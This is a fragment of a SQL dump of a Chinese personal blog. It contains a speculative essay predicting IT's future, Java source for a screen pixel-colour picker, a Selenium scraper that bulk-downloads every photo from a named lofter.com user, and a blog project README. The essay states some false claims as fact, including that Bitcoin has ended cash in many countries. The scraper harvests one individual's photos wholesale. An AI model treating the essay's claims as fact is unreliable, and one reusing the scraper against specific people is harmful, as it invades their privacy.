改但还是万变不离其宗，所以在将来一定会出现一个新的环境，没有标准，只有硬件的统一。windows，mac，Android以及iOS的主导地位等着崩溃吧：）\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n###第③大\r\n\r\n####技术达到饱和\r\n\r\n硬件厂商归并国有\r\n\r\n这个预言有点恐怖啊~你能想象现在牛逼哄哄的Intel，IBM，英伟达，AMD，日立，甚至苹果，在将来的某一天变得一文不值甚至从这个世界蒸发掉吗？虽然我是个果粉，但是走硬件这条路是没有结果的，只能说，硬件技术已经接近饱和了：无论是处理器，存储器还是显示器的技术革新已经逼近稳定，电子产品的价格也逐渐趋于水平。所以才有如今这个现象：我们买电子产品关注的更多的不是品牌开发商而是硬件参数的大小。\r\n\r\n为什么呢？反观第二次工业革命，电能和化学能技术的变迁也是从0到99.9%，期间不乏有各大团队和企业的品牌和旗帜，对科学进行着升级换代，但是现在呢？他们已不复存在，曾今的首富和大亨消失在人们心中，世界所留下来的只是一个个政府垄断的国有企业。\r\n\r\n\r\n\r\n标准组织被生吞\r\n\r\n除此之外，ISO以及RFC等各种有关计算机和互联网的标准和协议也要收敛。这些玩意儿同样会归并国有化，曾经享誉世界，定义了无数网际互联标准和算法加持专利的思科Cisco以及我们的华为同学，若不及时转型，地位也会危险。\r\n\r\n\r\n\r\n互联网公司的永生\r\n\r\n没错，真正存活下来的是那些提供服务的互联网公司：无论是做社交，电商，自媒体，还是搜索引擎，大数据和云计算，都是从服务的层面接收来自大众的源源不断的需求。换句话说，那些提供软硬件技术支持的以及建设互联网的企业都将走入末路，而那些利用软硬件和互联网的企业们最终将走向辉煌！虽然听上去有些残忍，但都是历代科技革命的悠悠青史。\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n###第④大\r\n\r\n####互联网正在收敛\r\n\r\n\r\n\r\n骨干网啊骨干网\r\n\r\n说实在，中国的网络建设太乱了，错综复杂乱七八糟惨不忍睹，不是没钱而是不愿花钱去修。导致很多朋友选择翻墙越狱。再加上网络中超过半数的流量都浪费在臃肿的地址信息和各种冗长的协议字段，如今的互联网是一个极度臃肿的系统（在专业人士眼里），不爆发安全问题才怪呢。未来，网络必须优化，不仅是“三网合一”，各个骨干网和运营商极有可能会合并！这的确很让人期待，到时候人人都能体验到“极简风”，地面网络和卫星网络合二为一也就意味着电话网和无线电台将和互联网整合统一！\r\n\r\n\r\n\r\n网络廉价，信息涨价\r\n\r\n未来人类将实现免费上网和通话！国家的通信部也会重大改革！网络会变得越来越廉价，但别高兴的太早，与此相反信息和软件服务会越来越昂贵。这个其实快从语言变成现实了，你能想象，你看的每一个视频，听的每一首歌都像支付宝一样悄无声息地从你的账户中扣费，而你却浑然不知，好不恐怖！\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n###第⑤大\r\n\r\n####智能化？这样真的好吗？\r\n\r\n\r\n\r\n所有用户接口全部虚拟化？\r\n\r\n想象这样的场景：你的所思所想所作所为，都可以通过语音指令传达给计算机，如同苹果siri，人工智能根据你的性格特征，为你完成一系列任务和计算。\r\n\r\n\r\n\r\n输入输出设备的多样化\r\n\r\n这也符合自由的理念。我们目前已有的主流输入设备有：鼠标、键盘、触控盘、触摸屏，我还能想到三大游戏主机的手柄以及赛车游戏的方向盘。虚拟现实设备是一个起点，它的输入设备连接在人体的头、手和腿等部位，大大丰富了输入方式。但之所以是个起点因为它还不够完美（玩过VR游戏的朋友都有体验），但这不妨碍我们幻想：将来有一天，你的 每一个细微举动，你每眨一下眼皮，卷一下舌头，打一个响指，每吸一口气，扭一扭屁股，收一收括约肌，都能化作一条条指令，传达给超级计算机来做出回应，何乐不为？\r\n\r\n       输出设备就更有前途了，目前我们知道有显示器和打印机以及3D打印机，但是否知道还有3D光学显示器，注意不是3D眼睛哦。\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n###第⑥大\r\n\r\n####“人类的技术到此止步”\r\n\r\n\r\n\r\n动态曲体顺序表\r\n\r\n不知有木有感受，图形化的世界全部是各种矩形：显示器是矩形的，窗口是矩形的，图片是矩形的，字符是矩形的，所有的图标和元素都是从左至右顺序排列的。个人认为这是不完美的。就位图文件而言，完全可以采用圆形的顺序结构来表示。至于操作系统嘛，何必拘泥于那矩形的条条框框呢？相信我，总有一天你或者我或者是他会开发出一套符合自己喜好的自由灵活的曲形主题的完美操作系统！\r\n\r\n\r\n\r\n数学达到极致\r\n\r\n不得不说，数学家对计算机科学的贡献至关重要，什么加密，压缩，排序，检索，寻路算法都是出自数学家的精炼，数学的发展貌似也是伴随着IT一起热闹起来的。但是很遗憾，近些年在算法上的进步明显放缓了，可想而知，在未来大部分算法将变成标准，数学家的冬天也将随之到来！\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n###第⑦大\r\n\r\n####！！多进制！！\r\n\r\n\r\n\r\n多进制计算机\r\n\r\n我觉得这是所有预言中最大胆也是最不要脸的一个了，毕竟如果多进制的出现，将会颠覆整个IT世界，而且毫无征兆会实现这个目标。不过既然是预言但也不用那么认真，于是我和小伙伴们脑洞大开：假如人类计算机升级成3进制，每个bit有三种不同状态，那么一个字节的存储容量将扩大数百倍。。。好了当然我知道这是不可能的，2进制还是目前最稳定的两极形态。\r\n\r\n\r\n\r\n人类得以操控原子\r\n\r\n哇哦(⊙o⊙)！放心，这个是可能的，西方科学家已经成功在一个Ho原子中存储和读取一个bit的数据，只是还需要克服周边问题。但这一突破足以让人类欢呼一阵子了。BUT，更更重要的是，这里的bit并不一定是2进制的bit，至少目前还不稳定，我们的硬盘中的每一个磁比特都是上百万个原子之间两极对立而成的，若是一个原子，很有可能超越两种内部状态！所以，多进制计算机还是有一丝希望的，若是真的到了那一天，IT环境又是另一说了。\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n###第⑧大\r\n\r\n####世界正在闭合\r\n\r\n\r\n\r\n比特币\r\n\r\n比特币（BitCoin）的概念自提出有了好些年头了，根据其思路而设计发布的开源软件及建构其上的P2P网络。比特币是一种P2P形式的数字货币，点对点的传输意味着一个去中心化的支付系统。比特币通过算法生成正真意义上实现了点对点的平等。这个预想已近在很多国家实现了，表现就是彻底封杀了现钞。\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n终生账户\r\n\r\n听起来很酷炫哈，这也是我梦寐以求的一个理想：如果我的所有网络账户，微信，微博，Apple，百度，领英。。。等等等，哦还有Steam，如果这些大公司的用户账号全都统一终身绑定在一个人身上，不知省去了多少维护的麻烦。遗憾的是，这个恐怕是看似容易缺最难实现的一个预想，商业利益是永恒的争端，合作永远发生于最终的窘境。\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n        Over，以上8个大主题就是我们团队讨论出的结果，其中不乏一些主观臆断和我对IT界的一些不满。总而言之，虽然是“恐怖”的预言，但仔细一想它们都是朝着好的方向发展的，但至于实不实现，实现了多少，那就没多大关系了：本文用于交流没有站在任何代表方。谢谢！',4282),(63,'鼠标像素拾取器的实现(坐标&RGB)','2018-02-17 11:04:54',0,0,3,'环境:jdk1.2+\r\n包:\r\n>import java.awt.BorderLayout;\r\nimport java.awt.Color;\r\nimport java.awt.Font;\r\nimport java.awt.Point;\r\nimport java.awt.Robot;\r\nimport java.awt.Toolkit;\r\nimport java.awt.datatransfer.Clipboard;\r\nimport java.awt.datatransfer.StringSelection;\r\nimport java.awt.datatransfer.Transferable;\r\nimport java.awt.event.KeyEvent;\r\nimport java.awt.event.KeyListener;\r\nimport java.util.Timer;\r\nimport java.util.TimerTask;\r\nimport javax.swing.JFrame;\r\nimport javax.swing.JLabel;\r\nimport javax.swing.JPanel;\r\nimport javax.swing.border.EmptyBorder;\r\n\r\n主类:MousePixInfo3(main内实例化)\r\n\r\n**第一步:设计界面\r\n构造函数内渲染jframe\r\n过程略..\r\n\r\n第二步:调用标准库:\r\n  利用Robot.getPixelColor(x,y)方法得到Color对象;\r\n  利用MouseInfo.getPointerInfo().getLocation()得到Point对象;\r\n  利用Integer.toHexString(int i)方法将rgb值转成更易读的十六进制;\r\n  利用Timer.schedule(TimerTask timerTask)周期刷新像素信息;\r\n\r\n第三步:扩展功能:\r\n 1.jframe置顶(Jframe.setAlwaysOnTop(true))(非聚焦)\r\n 2.esc键退出(System.exit(0))\r\n 3.空格暂停(timer.cancel())\r\n 4.L键将坐标值存入系统剪切板\r\n 5.C键将颜色值存入系统剪切板**\r\n\r\n源码:\r\n```\r\npackage test;\r\n\r\nimport java.awt.BorderLayout;\r\nimport java.awt.Color;\r\nimport java.awt.Font;\r\nimport java.awt.Point;\r\nimport java.awt.Robot;\r\nimport java.awt.Toolkit;\r\nimport java.awt.datatransfer.Clipboard;\r\nimport java.awt.datatransfer.StringSelection;\r\nimport java.awt.datatransfer.Transferable;\r\nimport java.awt.event.KeyEvent;\r\nimport java.awt.event.KeyListener;\r\nimport java.util.Timer;\r\nimport java.util.TimerTask;\r\n\r\nimport javax.swing.JFrame;\r\nimport javax.swing.JLabel;\r\nimport javax.swing.JPanel;\r\nimport javax.swing.border.EmptyBorder;\r\n\r\npublic class MousePixInfo3 extends JFrame {\r\n\r\n	/**\r\n	 * \r\n	 */\r\n	private static final long serialVersionUID = 1L;\r\n	private final JPanel contentPanel = new JPanel();\r\n	static JLabel value_x = null;\r\n	static JLabel value_y = null;\r\n	static JLabel myPixColorHex = null;\r\n	static Robot myRobot;\r\n	static Timer timer = new Timer();\r\n	JLabel lblx = new JLabel(\"X :\");\r\n	JLabel lbly = new JLabel(\"Y :\");\r\n	static boolean isRunning = true;\r\n	JLabel note1;\r\n	JLabel note2;\r\n\r\n	/**\r\n	 * Launch the application.\r\n	 */\r\n	public static void main(String[] args) {\r\n		try {\r\n			myRobot = new Robot();\r\n			MousePixInfo3 info_frame = new MousePixInfo3();\r\n			info_frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\r\n			info_frame.setVisible(true);\r\n			info_frame.setAlwaysOnTop(true);\r\n			info_frame.addKeyListener(new KeyListener() {\r\n\r\n				@Override\r\n				public void keyTyped(KeyEvent e) {\r\n					// TODO Auto-generated method stub\r\n\r\n				}\r\n\r\n				@Override\r\n				public void keyReleased(KeyEvent e) {\r\n					// TODO Auto-generated method stub\r\n\r\n				}\r\n\r\n				@Override\r\n				public void keyPressed(KeyEvent e) {\r\n					// TODO Auto-generated method stub\r\n					if (e.getKeyCode() == KeyEvent.VK_ESCAPE) {\r\n						System.exit(0);\r\n					} else if (e.getKeyChar() == \' \') {\r\n						if (isRunning) {\r\n							timer.cancel();\r\n							isRunning = false;\r\n						} else {\r\n							run();\r\n							isRunning = true;\r\n						}\r\n					} else if (e.getKeyChar() == \'l\') {\r\n						setSysClipboardText(value_x.getText() + \",\" + value_y.getText());\r\n					} else if (e.getKeyChar() == \'c\') {\r\n						setSysClipboardText(myPixColorHex.getText());\r\n\r\n					}\r\n				}\r\n			});\r\n			run();\r\n		} catch (Exception e) {\r\n			e.printStackTrace();\r\n		}\r\n	}\r\n\r\n	/**\r\n	 * Create the dialog.\r\n	 */\r\n\r\n	public static void setSysClipboardText(String writeMe) {\r\n		Clipboard clip = Toolkit.getDefaultToolkit().getSystemClipboard();\r\n		Transferable tText = new StringSelection(writeMe);\r\n		clip.setContents(tText, null);\r\n	}\r\n\r\n	public static void run() {\r\n		timer = new Timer();\r\n		timer.schedule(new TimerTask() {\r\n			@Override\r\n			public void run() {\r\n				Point point = java.awt.MouseInfo.getPointerInfo().getLocation();\r\n				Color myPixColor = myRobot.getPixelColor(point.x, point.y);\r\n				String r = Integer.toHexString(myPixColor.getRed());\r\n				String g = Integer.toHexString(myPixColor.getGreen());\r\n				String b = Integer.toHexString(myPixColor.getBlue());\r\n\r\n				value_x.setText(\"\" + point.x); // 双引号\"\"把int转成string\r\n				value_y.setText(\"\" + point.y);\r\n				myPixColorHex.setText(\"#\" + r + g + b);\r\n			}\r\n		}, 100, 50);// 设置100ms后开始,每50ms检测一次坐标\r\n	}\r\n\r\n	public MousePixInfo3() {\r\n		timer = new Timer();\r\n		setTitle(\"像素采集神器\");\r\n		setBounds(100, 100, 317, 192);\r\n		getContentPane().setLayout(new BorderLayout());\r\n		contentPanel.setBorder(new EmptyBorder(5, 5, 5, 5));\r\n		getContentPane().add(contentPanel, BorderLayout.CENTER);\r\n		contentPanel.setLayout(null);\r\n\r\n		lblx.setFont(new Font(\"宋体\", Font.PLAIN, 15));\r\n		lblx.setBounds(22, 27, 66, 31);\r\n		contentPanel.add(lblx);\r\n\r\n		lbly.setFont(new Font(\"宋体\", Font.PLAIN, 15));\r\n		lbly.setBounds(22, 68, 66, 31);\r\n		contentPanel.add(lbly);\r\n\r\n		value_x = new JLabel(\"0\");\r\n		value_x.setForeground(Color.BLUE);\r\n		value_x.setFont(new Font(\"宋体\", Font.PLAIN, 20));\r\n		value_x.setBounds(64, 27, 66, 31);\r\n		contentPanel.add(value_x);\r\n\r\n		value_y = new JLabel(\"0\");\r\n		value_y.setForeground(Color.BLUE);\r\n		value_y.setFont(new Font(\"宋体\", Font.PLAIN, 20));\r\n		value_y.setBounds(64, 68, 66, 31);\r\n		contentPanel.add(value_y);\r\n\r\n		myPixColorHex = new JLabel(\"0\");\r\n		myPixColorHex.setForeground(Color.RED);\r\n		myPixColorHex.setFont(new Font(\"宋体\", Font.PLAIN, 32));\r\n		myPixColorHex.setBounds(142, 48, 128, 31);\r\n		contentPanel.add(myPixColorHex);\r\n\r\n		note1 = new JLabel(\"esc退出;Space暂停/继续\", JLabel.CENTER);\r\n		note1.setFont(new Font(\"幼圆\", Font.PLAIN, 16));\r\n		getContentPane().add(note1, BorderLayout.SOUTH);\r\n\r\n		note2 = new JLabel(\"\'l\'复制location;\'c\'复制color\", JLabel.CENTER);\r\n		note2.setFont(new Font(\"幼圆\", Font.PLAIN, 16));\r\n		getContentPane().add(note2, BorderLayout.NORTH);\r\n\r\n	}\r\n}\r\n```',5618),(64,'selenuim爬虫实战(日lofter.com)','2018-02-18 12:16:51',3,0,4,'>LOFTER是网易公司2011年8月下旬推出的一款轻博客产品。\r\nLOFTER专注于为用户提供简约、易用、有品质、重原创的博客工具、原创社区，以及有品质的手机博客应用。\r\nLOFTER首次采用独立域名，口号为\"专注兴趣，分享创作\"。 一经上线，便受到了互联网众多文艺青年、摄影师、插画师的喜爱。\r\n\r\n作为中国的Instagram,自然是很多人爬虫的目标,之前我写过一篇关于如何电脑批量上传Instagram图片的文章,这次来点高级的,来做一个lofter的批量下载器.\r\n\r\n###环境\r\neclipse, selenium包, firefox\r\n###目标\r\n制作下载器,输入用户名,下载其账户上的所有照片\r\n###原理介绍\r\n\"http://\" + username + \".lofter.com/view\"是lofter提供的用户图片摘要视图,可以通过ajax动态加载的方法在一张网页上显示出用户所有的图片.我们就可以通过selenium模拟用户滚动瀑布流,再通过ECMAScript捕捉到所有图片的url,最后利用java发送get包下载所有图片.\r\n###准备工作\r\n为了节省流量和时间,我们既不加载图片(加载出来的只是缩略图,没用),也不要加载界面了(节省本地资源).\r\n注意,这两个节省是相互独立的.\r\n>FirefoxOptions options = new FirefoxOptions();\r\n\r\n		// 启动配置\"不加载图片\"\r\n		options.addPreference(\"permissions.default.image\", 2);\r\n\r\n		// 启动参数\"无界面\"\r\n		FirefoxBinary myBinary = new FirefoxBinary();\r\n		myBinary.addCommandLineOptions(\"--headless\");\r\n		options.setBinary(myBinary);\r\n>FirefoxDriver driver = new FirefoxDriver(options);\r\n\r\n###实现方式\r\n下一篇文章将公布源码\r\n\r\n- 键入pageDown键以触发ajax瀑布流\r\n- 通过Dom元素的element.children.length属性值的累加获得图片总数\r\n- 在控制台输出所有url(暂停),以便核实再下载\r\n- 开启多线程超时跳过机制,防止损坏的url\r\n- 设置selenium的隐式等待和显式等待\r\n\r\n###注意事项\r\n在经过了多次试验之后得到的最优方案.\r\n\r\n- 利用页面提供的数据(页首\'文章数量\'字段)可以得到用户全部的图片数量以供参考\r\n- 循环检测的时候不要傻不拉几的数元素的数量,而要通过length值直接获得,因为JS比java要脆弱的多\r\n- 结束标志最好基于数量增长周期超时\r\n- url需要裁剪,去掉问号之后的参数(这些参数用来生成缩略图)\r\n- 下载时切记从流的头字节获取mime信息,用来生成后缀名\r\n\r\n>源码请见下文.',1286),(65,'selenuim爬虫实战(源码)','2018-02-18 12:16:51',1,0,4,'>SuperLOFTERDownloader7.java\r\n\r\n```\r\npackage test;\r\n\r\nimport java.io.IOException;\r\nimport java.util.ArrayList;\r\nimport java.util.Timer;\r\nimport java.util.TimerTask;\r\nimport java.util.concurrent.TimeUnit;\r\n\r\nimport javax.swing.JOptionPane;\r\n\r\nimport org.openqa.selenium.By;\r\nimport org.openqa.selenium.JavascriptExecutor;\r\nimport org.openqa.selenium.Keys;\r\nimport org.openqa.selenium.WebElement;\r\nimport org.openqa.selenium.firefox.FirefoxBinary;\r\nimport org.openqa.selenium.firefox.FirefoxDriver;\r\nimport org.openqa.selenium.firefox.FirefoxOptions;\r\nimport org.openqa.selenium.interactions.Actions;\r\n\r\npublic class SuperLOFTERDownloader7 {\r\n	// static String html;\r\n	static int urlCount = 0;\r\n	static String username = \"fenchenyue\";\r\n	static String url = \"http://\" + username + \".lofter.com/view\";\r\n	static String picUrl;\r\n	static boolean ifToBreak = false;\r\n	static ArrayList<String> urlList = new ArrayList<String>();\r\n	// 注意:目录路径必须以\"\\\"结尾\r\n	static String downloadToDir = \"E:\\\\爬虫\\\\妹纸2\\\\\";\r\n\r\n	public static void main(String[] args) {\r\n		System.setProperty(\"webdriver.gecko.driver\", \"C:\\\\Users\\\\Jim\\\\Desktop\\\\GeckoDriver\\\\geckodriver.exe\");\r\n\r\n		FirefoxOptions options = new FirefoxOptions();\r\n\r\n		// 启动配置\"不加载图片\"\r\n		options.addPreference(\"permissions.default.image\", 2);\r\n\r\n		// 启动参数\"无界面\"\r\n		FirefoxBinary myBinary = new FirefoxBinary();\r\n		myBinary.addCommandLineOptions(\"--headless\");\r\n		options.setBinary(myBinary);\r\n\r\n		FirefoxDriver driver = new FirefoxDriver(options);\r\n		driver.manage().timeouts().implicitlyWait(16, TimeUnit.SECONDS); // 隐式等待\r\n		driver.get(url);\r\n\r\n		// ((JavascriptExecutor)\r\n		// driver).executeScript(\"document.querySelector(\'.m-txtsch\').style.display=\\\"inline\\\"\");\r\n\r\n		int givenNumber = Integer.parseInt(driver.findElementByCssSelector(\r\n				\"body > div.g-bdfull.g-bdfull-show.ztag > div.g-bdc.ztag > div.m-fbar.f-cb > div.schbtn.f-cb > div:nth-child(1) > div > div.txt > a.ztag.currt > span\")\r\n				.getAttribute(\"innerHTML\"));\r\n\r\n		Actions action = new Actions(driver);\r\n\r\n		Timer timer = new Timer();\r\n		timer.schedule(new TimerTask() {\r\n\r\n			@Override\r\n			public void run() {\r\n				// TODO Auto-generated method stub\r\n				action.sendKeys(/* driver.findElement(By.cssSelector(\"body\")), */ Keys.END).perform();\r\n			}\r\n		}, 1, 700);\r\n\r\n		/*\r\n		 * WebDriverWait wait = new WebDriverWait(driver, 256, 2048);\r\n		 * wait.until(ExpectedConditions .numberOfElementsToBe(By.\r\n		 * cssSelector(\"div.ztag > div.m-filecnt.m-filecnt-1 > ul > li\"), number));\r\n		 */\r\n\r\n		new Thread(new Runnable() {\r\n\r\n			@Override\r\n			public void run() {\r\n				// TODO Auto-generated method stub\r\n				int flag = JOptionPane.showConfirmDialog(null, \"正在收集资源...\\n如果觉得时间过长,点击\'是\'提前中断\", \"是否中断\",\r\n						JOptionPane.YES_NO_OPTION);\r\n				if (flag == JOptionPane.YES_OPTION) {\r\n					ifToBreak = true;\r\n				}\r\n			}\r\n		}).start();\r\n\r\n		// 周期查询文档是否加载完或者用户选择中断\r\n		String js = \"let count=0;document.querySelectorAll(\'.g-bdc > div:nth-child(3) > div.m-filecnt.m-filecnt-1 > ul\').forEach(function(e,i){count+=e.children.length});return count;\";\r\n		while (true) {\r\n\r\n			long countFromJs = (long) ((JavascriptExecutor) driver).executeScript(js);\r\n			System.out.println(\"已收集到资源数 : \" + countFromJs);\r\n			if (Math.abs((int) countFromJs - givenNumber) < 5 || ifToBreak) {\r\n				break;\r\n			}\r\n			try {\r\n				Thread.sleep(1600);\r\n			} catch (InterruptedException e) {\r\n				// TODO Auto-generated catch block\r\n				e.printStackTrace();\r\n			}\r\n		}\r\n		timer.cancel();\r\n\r\n		for (WebElement element : driver.findElements(\r\n				By.cssSelector(\"div.ztag > div.m-filecnt.m-filecnt-1 > ul > li > a > div > div > img.realimg\"))) {\r\n			picUrl = element.getAttribute(\"src\").split(\"\\\\?\")[0];\r\n			System.out.println(picUrl);\r\n			urlList.add(picUrl);\r\n			urlCount++;\r\n\r\n		}\r\n\r\n		System.out.println(\"爬取到\" + givenNumber + \"篇文章中的\" + urlCount + \"张图的url\");\r\n\r\n		int flag = JOptionPane.showConfirmDialog(null, \"核对url,是否开始下载?\", \"是否继续\", JOptionPane.YES_NO_OPTION);\r\n		if (flag == JOptionPane.NO_OPTION) {\r\n			System.exit(0);\r\n		} else if (flag == JOptionPane.YES_OPTION) {\r\n			System.out.println(\"正在下载.....\");\r\n			try {\r\n				Runtime.getRuntime().exec(\"explorer \" + downloadToDir);\r\n			} catch (IOException e) {\r\n				// TODO Auto-generated catch block\r\n				e.printStackTrace();\r\n			}\r\n			System.out.println(\"完成,成功下载了\" + DownloadFromUrlList3.download(urlList, downloadToDir) + \"张图\");\r\n			System.out.println(\"失败数:\" + DownloadFromUrlList3.errCount);\r\n		}\r\n		// JOptionPane.showMessageDialog(null, \"浏览器可以关闭了吗?\");\r\n		driver.quit();\r\n		System.exit(0);\r\n	}\r\n}\r\n```\r\n>DownloadFromUrlList3.java\r\n\r\n```\r\npackage test;\r\n\r\nimport java.io.BufferedInputStream;\r\nimport java.io.File;\r\nimport java.io.FileOutputStream;\r\nimport java.io.IOException;\r\nimport java.io.OutputStream;\r\nimport java.net.HttpURLConnection;\r\nimport java.net.URL;\r\nimport java.util.ArrayList;\r\n\r\npublic class DownloadFromUrlList3 {\r\n	static private int count = 0;\r\n	static ThreadGroup myThreadGroup = new ThreadGroup(\"myGroup\");\r\n	static picThread myThread;\r\n	public static int errCount = 0;\r\n	static long timeOut = 8 * 1000;\r\n\r\n	public static synchronized int updateCount() {\r\n		count++;\r\n		return count;\r\n	};\r\n\r\n	public static int download(ArrayList<String> urlList, String dirPath) {\r\n		if (new File(dirPath).exists()) {\r\n			if (!new File(dirPath).isDirectory()) {\r\n				System.out.println(\"ERROR!! THE PATH GIVEN ISN\'T A DIRECTORY\");\r\n				return 0;\r\n			}\r\n		} else {\r\n			new File(dirPath).mkdir();\r\n		}\r\n\r\n		for (String urlstr : urlList) {\r\n			String myUrlStr = urlstr;\r\n			myThread = new picThread(myThreadGroup, new Runnable() {\r\n\r\n				@Override\r\n				public void run() {\r\n					// TODO Auto-generated method stub\r\n					try {\r\n						URL url = new URL(myUrlStr);\r\n						BufferedInputStream is;\r\n						try {\r\n							// 网络流量一定要用高效的buffered\r\n							is = new BufferedInputStream(url.openStream());\r\n						} catch (Exception e) {\r\n							// TODO Auto-generated catch block\r\n							System.out.println(\"发现一个url资源出错:\\n\" + myUrlStr);\r\n							errCount++;\r\n							return;\r\n						}\r\n						String extention = \".\" + HttpURLConnection.guessContentTypeFromStream(is).split(\"/\")[1];\r\n						File file = new File(dirPath + updateCount() + extention);\r\n						((picThread) Thread.currentThread()).file = file;\r\n						file.createNewFile();\r\n						OutputStream os = new FileOutputStream(file);\r\n						int len;\r\n						byte[] buffer = new byte[1024];\r\n						while ((len = is.read(buffer)) != -1) {\r\n							os.write(buffer, 0, len);\r\n						}\r\n						is.close();\r\n						os.close();\r\n					} catch (IOException e) {\r\n						// TODO Auto-generated catch block\r\n						e.printStackTrace();\r\n					}\r\n\r\n				}\r\n			});\r\n			myThread.urlStr = myUrlStr;\r\n			myThread.start();\r\n			// threadList.add(myThread);\r\n			try {\r\n				myThread.join(timeOut);\r\n			} catch (InterruptedException e) {\r\n				// TODO Auto-generated catch block\r\n				e.printStackTrace();\r\n			}\r\n		}\r\n\r\n		/*\r\n		 * for (Thread iThread : threadList) { try { // 等待所有线程执行完毕 iThread.join(1000 *\r\n		 * 15); } catch (InterruptedException e) { e.printStackTrace(); } }\r\n		 */\r\n		try {\r\n			Thread.sleep(1024);\r\n		} catch (InterruptedException e) {\r\n			// TODO Auto-generated catch block\r\n			e.printStackTrace();\r\n		}\r\n		Thread[] activeThreads = new Thread[myThreadGroup.activeCount()];\r\n		myThreadGroup.enumerate(activeThreads);\r\n		for (Thread thread : activeThreads) {\r\n			System.out.println(\"一张图片下载超时 :\" + ((picThread) thread).file.getName() + \"\\n\" + ((picThread) thread).urlStr);\r\n			errCount++;\r\n			// ((picThread) thread).file.delete();\r\n		}\r\n		return count - myThreadGroup.activeCount();\r\n	}\r\n\r\n	// 使用示例:\r\n	public static void main(String[] args) {\r\n		ArrayList<String> list = new ArrayList<String>();\r\n		list.add(\r\n				\"http://imglf1.nosdn.127.net/img/WnhZUEZYSVNPd1lsd1doNjVPSWVkREFwNTRrNTdUM2tQYkk2bHVabHpIYjJOZVFFeEdaUWRnPT0.jpg\");\r\n		list.add(\"http://imgsrc.baidu.com/imgad/pic/item/b58f8c5494eef01f2c2e59feebfe9925bc317dd6.jpg\");\r\n		list.add(\r\n				\"http://imglf1.nosdn.127.net/img/WnhZUEZYSVNPd1p2Wk54NlRNMTZKLzJnci9HanJsbUNFUTlJdWdFaDhJQUlQQ3h5Y1kzOFlRPT0.jpg\");\r\n		list.add(\"http://b.hiphotos.baidu.com/image/pic/item/7a899e510fb30f247b237cc9c195d143ac4b03ba.jpg\");\r\n		System.out.println(\"完成,成功下载了:\" + download(list, \"C:\\\\Users\\\\Jim\\\\Desktop\\\\testPic\\\\\"));\r\n		System.out.println(\"失败:\" + DownloadFromUrlList3.errCount);\r\n		System.exit(0);\r\n	}\r\n\r\n}\r\n\r\nclass picThread extends Thread {\r\n	public String urlStr = \"\";\r\n	public File file;\r\n	/*\r\n	 * public void setUrl(String url) { urlStr = url; }\r\n	 * \r\n	 * public String getUrl() { return urlStr; }\r\n	 */\r\n\r\n	public picThread(ThreadGroup group, Runnable run) {\r\n		super(group, run);\r\n	}\r\n}\r\n```',8572),(66,'简历备份.jpg','2018-02-18 13:55:00',1,0,9,'###更新于2018-02-28\r\n####pdf下载地址https://pan.baidu.com/s/1ggn6zxL\r\n![](https://upload-images.jianshu.io/upload_images/8974305-6587b864b657ae9f.jpg)',143),(67,'此博客在GitHub上的README.md','2018-02-20 21:42:00',0,0,12,'# OpenIdea Blog - 开源灵感博客\r\n\r\na personal blog site based on Java/Mysql - 基于Java/Mysql的个人博客网站;此时已经更新至version@20.1;这是一个java web博客项目，尽最大可能实现mvc模式，没有使用到框架，实现了首页预览，文章发布，点赞，评论，Markdown格式编写，分类，标签，阅读排行，时间轴，管理员管理博客，访客记录等。\r\n\r\n## introduction - 简介\r\n\r\n\r\n* 博客的初始版本用到的技术有jsp,servlet,mysql,bootstrap,html/css/js,ajax,json\r\n\r\n* 其中jsp技术用到了jstl标签库,el表达式和标准动作等,并没用使用纯java,便于日后扩展\r\n\r\n* 数据库连接池使用了[c3p0](http://www.mchange.com/projects/c3p0/) 你可以在src/c3p0-config.xml配置连接池和数据库信息\r\n\r\n* 后端也没有任何框架,摒弃了庞大而臃肿的SSL框架(洁癖哈哈)\r\n\r\n* Markdown编辑器使用了[editor.md](https://github.com/pandao/editor.md)\r\n\r\n\r\n##软件使用说明*\r\n\r\n	1. 先确保服务器环境的正确安装和配置,过程略,其中包括jdk1.8+;tomcat8.5+;mysql5.7+;\r\n	\r\n	2. 源码拿到手,先导入eclipse或者intellij以进行编译;\r\n	\r\n	3. 然后找到src目录下的c3p0-config.xml文件填写唯一的mysql用户名和密码;(必须拥有读和写的权限)\r\n	\r\n	4. 后台进入mysql创建名为\'myblog\'的库,然后导入src目录下的openidea.sql文件;\r\n	\r\n	5. 进入myblog.t_user表,按照表头添加一个管理员(站长)账户;\r\n	\r\n	6. 将导出的war包上传到tomcat服务器的webapps目录下,即可通过\'yourdomain:8080/Blog\'访问;\r\n	\r\n	7. 管理员后台登录默认是根目录下的myLogin.html,最好修改文件名,以使其只为自己服务;\r\n	\r\n	8. 尽情的享受修改源码的快乐吧!\r\n\r\n### database - 数据库\r\n\r\n* t_article - 文章表\r\n* t_comment - 评论表\r\n* t_user - 管理员表\r\n* t_visitor - 访问记录表\r\n* t_history - 版本更新表\r\n* labels - 标签表\r\n* label_relation - 标签&文章关系表\r\n\r\n### directory intro - 目录介绍\r\n\r\n#### java\r\n* blog/ajax 接受ajax请求的servlet\r\n* blog/dao 数据库接口类\r\n* blog/daoImple 数据库接口实现类\r\n* blog/db 非主要业务的DB操作/连接池的实现\r\n* blog/filter 过滤器\r\n* blog/model bean包\r\n* blog/service 面向web的服务层\r\n* blog/servlet 主要的控制器servlet\r\n* blog/utils 辅助工具包\r\n\r\n#### 前端目录\r\n* admin 管理员网页\r\n* css CSS目录\r\n* editormd MD编辑器\r\n* img 图片\r\n* js JS目录\r\n* page 主要网页\r\n* upload 图片上传文件夹\r\n\r\n### jar intro - 使用到的jar包\r\n* mysql-connector-java   jdbc包\r\n* c3p0-0.9.5.2.jar     c3p0数据库连接池\r\n* mchange-commons-java.jar 		c3p0依赖包\r\n* commons-beanutils-1.9.3-bin.zip  JavaBean工具包\r\n* commons-logging-1.2-bin.zip\r\n* jstl.jar  		jstl标签库\r\n* standard.jar \r\n* commons-fileupload.jar 文件上传\r\n* commons-io-2.5.jar\r\n* commons-lang-2.5.jar\r\n* commons-collections-3.1 集合工具包\r\n* 